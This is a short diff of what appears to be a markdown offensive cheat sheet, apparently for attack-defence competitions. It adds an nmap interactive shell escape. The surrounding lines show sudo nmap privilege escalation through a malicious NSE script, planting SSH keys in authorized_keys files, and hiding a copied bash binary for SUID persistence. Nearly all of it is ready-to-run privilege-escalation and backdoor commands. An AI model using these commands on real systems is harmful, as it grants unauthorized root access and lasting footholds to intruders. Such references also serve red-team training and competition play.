@@ -129,6 +129,11 @@ Create a team ssh key and drop it into any authorzied_keys files you can in user
 ### Privesc for nmap if allowed by sudo
 &nbsp;&nbsp;&nbsp;&nbsp;<code>echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse</code>
 
+~~~
+nmap --interactive
+nmap> !sh
+~~~
+
 ### Copy existing shells with suid and hide them for persistence 
 
  1. <code>cp /bin/bash /.svc</code>
